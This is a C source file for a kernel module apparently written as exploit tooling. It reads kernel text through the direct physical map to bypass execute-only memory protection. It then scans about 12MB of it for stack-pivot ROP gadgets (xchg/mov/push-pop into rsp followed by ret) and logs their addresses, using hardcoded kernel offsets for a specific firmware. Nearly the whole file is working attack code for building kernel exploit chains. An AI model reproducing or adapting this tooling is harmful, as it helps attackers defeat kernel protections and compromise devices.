#include <stdint.h>

/*
 * pivot_scan — DMAP-based ktext pivot gadget scanner
 *
 * Instead of executing candidate gadgets (which panics on privileged
 * instructions), this reads ktext bytes via DMAP to bypass XOM and
 * searches for exact byte patterns:
 *
 *   Pattern 0: xchg rsp, rax; ret     = 48 94 C3
 *   Pattern 1: push rax; pop rsp; ret = 50 5C C3
 *   Pattern 2: mov rsp, rax; ret      = 48 89 C4 C3
 *   Pattern 3: xchg rsp, rax; ret     = 48 87 E0 C3 (alternate encoding)
 *
 * Scans the ENTIRE ktext segment (~12MB) in one run.
 * No execution of unknown code = no panics.
 *
 * Output layout (uint64_t indices):
 *   [0]  magic "PSRC" (0x50535243) | num_hits(32)
 *   [1]  kdata_base
 *   [2]  ktext_base
 *   [3]  dmap_base
 *   [4]  bytes_scanned
 *   [5]  scan_status (1=complete, 0xAAAA=in_progress, 0xDEAD=dmap_fail)
 *   Per hit (starting at index 6, 4 uint64_t each):
 *     [6+i*4+0]  address (kernel VA)
 *     [6+i*4+1]  ktext_offset
 *     [6+i*4+2]  pattern_id | (pattern_len << 8)
 *     [6+i*4+3]  16 bytes of context (8 before + pattern start)
 *
 * Max hits: (2304/8 - 6) / 4 = 70
 */

#define MAGIC_PSRC           0x50535243  /* "PSRC" */
#define KTEXT_SIZE           0xC00000    /* 12MB */
#define OFF_KERNEL_PMAP_STORE 0x3257a78
#define MAX_HITS             70
#define HEADER_SLOTS         6

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read_cr3(void)
{
    uint64_t val;
    __asm__ volatile("mov %%cr3, %0" : "=r"(val));
    return val;
}

static uint64_t find_dmap_base(uint64_t kdata_base)
{
    uint64_t kernel_pmap_addr = kdata_base + OFF_KERNEL_PMAP_STORE;
    uint64_t pm_pml4 = *(volatile uint64_t*)kernel_pmap_addr;
    uint64_t cr3 = read_cr3();
    uint64_t cr3_phys = cr3 & 0x000FFFFFFFFFF000ULL;
    return pm_pml4 - cr3_phys;
}

static uint64_t va_to_pa(uint64_t va, uint64_t dmap_base)
{
    uint64_t cr3 = read_cr3();
    uint64_t pml4_phys = cr3 & 0x000FFFFFFFFFF000ULL;

    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pml4e = *(volatile uint64_t*)(dmap_base + pml4_phys + pml4_idx * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pml3_phys = pml4e & 0x000FFFFFFFFFF000ULL;
    uint64_t pml3_idx = (va >> 30) & 0x1FF;
    uint64_t pml3e = *(volatile uint64_t*)(dmap_base + pml3_phys + pml3_idx * 8);
    if (!(pml3e & 1)) return 0;
    if (pml3e & 0x80)
        return (pml3e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    uint64_t pml2_phys = pml3e & 0x000FFFFFFFFFF000ULL;
    uint64_t pml2_idx = (va >> 21) & 0x1FF;
    uint64_t pml2e = *(volatile uint64_t*)(dmap_base + pml2_phys + pml2_idx * 8);
    if (!(pml2e & 1)) return 0;
    if (pml2e & 0x80)
        return (pml2e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    uint64_t pml1_phys = pml2e & 0x000FFFFFFFFFF000ULL;
    uint64_t pml1_idx = (va >> 12) & 0x1FF;
    uint64_t pml1e = *(volatile uint64_t*)(dmap_base + pml1_phys + pml1_idx * 8);
    if (!(pml1e & 1)) return 0;

    return (pml1e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

/*
 * Read a page of ktext via DMAP. Returns 1 on success, 0 on translation failure.
 */
static int dmap_read_page(uint8_t* dst, uint64_t va, uint64_t dmap_base)
{
    uint64_t pa = va_to_pa(va, dmap_base);
    if (pa == 0) return 0;

    volatile uint8_t* src = (volatile uint8_t*)(dmap_base + pa);
    for (int i = 0; i < 0x1000; i++)
        dst[i] = src[i];
    return 1;
}

/*
 * Record a hit. Returns new hit count.
 */
static int record_hit(volatile uint64_t* out, int hits, uint64_t addr,
                       uint64_t ktext_base, int pattern_id, int pattern_len,
                       uint8_t* page_buf, int byte_offset_in_page)
{
    if (hits >= MAX_HITS) return hits;

    int base = HEADER_SLOTS + hits * 4;
    out[base + 0] = addr;
    out[base + 1] = addr - ktext_base;
    out[base + 2] = (uint64_t)pattern_id | ((uint64_t)pattern_len << 8);

    /* Grab 16 bytes of context: 8 before pattern start */
    uint64_t ctx = 0;
    int ctx_start = byte_offset_in_page - 8;
    for (int i = 0; i < 8; i++) {
        int pos = ctx_start + i;
        if (pos >= 0 && pos < 0x1000)
            ctx |= (uint64_t)page_buf[pos] << (i * 8);
    }
    out[base + 3] = ctx;

    return hits + 1;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    volatile uint64_t* out = (volatile uint64_t*)args;

    /* Write header immediately */
    out[0] = ((uint64_t)0 << 32) | MAGIC_PSRC;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = 0;  /* dmap_base - filled below */
    out[4] = 0;  /* bytes_scanned */
    out[5] = 0xAAAA;  /* in_progress */

    uint64_t dmap_base = find_dmap_base(kdata_base);
    out[3] = dmap_base;

    if (dmap_base == 0) {
        out[5] = 0xDEAD;
        return -1;
    }

    /* Page buffer on stack (4KB) */
    uint8_t page_buf[0x1000];
    int hits = 0;
    uint64_t total_scanned = 0;
    int num_pages = KTEXT_SIZE / 0x1000;  /* 3072 pages */

    for (int pg = 0; pg < num_pages && hits < MAX_HITS; pg++) {
        uint64_t page_va = ktext_base + (uint64_t)pg * 0x1000;

        if (!dmap_read_page(page_buf, page_va, dmap_base)) {
            /* Page not mapped - skip */
            total_scanned += 0x1000;
            continue;
        }

        /* Scan this page for patterns.
         * We need to handle patterns that cross page boundaries,
         * but for simplicity we scan within page (miss at most 3 bytes
         * at boundary — extremely unlikely to matter). */

        for (int i = 0; i < 0x1000 - 2; i++) {
            /* Pattern 0: xchg rsp, rax; ret = 48 94 C3 */
            if (page_buf[i] == 0x48 && page_buf[i+1] == 0x94 && page_buf[i+2] == 0xC3) {
                hits = record_hit(out, hits, page_va + i, ktext_base, 0, 3, page_buf, i);
            }

            /* Pattern 1: push rax; pop rsp; ret = 50 5C C3 */
            if (page_buf[i] == 0x50 && page_buf[i+1] == 0x5C && page_buf[i+2] == 0xC3) {
                hits = record_hit(out, hits, page_va + i, ktext_base, 1, 3, page_buf, i);
            }

            /* Pattern 2: mov rsp, rax; ret = 48 89 C4 C3 (4 bytes) */
            if (i < 0x1000 - 3) {
                if (page_buf[i] == 0x48 && page_buf[i+1] == 0x89 &&
                    page_buf[i+2] == 0xC4 && page_buf[i+3] == 0xC3) {
                    hits = record_hit(out, hits, page_va + i, ktext_base, 2, 4, page_buf, i);
                }
            }

            /* Pattern 3: xchg rsp, rax; ret = 48 87 E0 C3 (alternate, 4 bytes) */
            if (i < 0x1000 - 3) {
                if (page_buf[i] == 0x48 && page_buf[i+1] == 0x87 &&
                    page_buf[i+2] == 0xE0 && page_buf[i+3] == 0xC3) {
                    hits = record_hit(out, hits, page_va + i, ktext_base, 3, 4, page_buf, i);
                }
            }
        }

        total_scanned += 0x1000;

        /* Update progress every 256 pages (~1MB) */
        if ((pg & 0xFF) == 0) {
            out[4] = total_scanned;
        }
    }

    /* Final results */
    out[0] = ((uint64_t)hits << 32) | MAGIC_PSRC;
    out[4] = total_scanned;
    out[5] = 1;  /* complete */

    return 0;
}
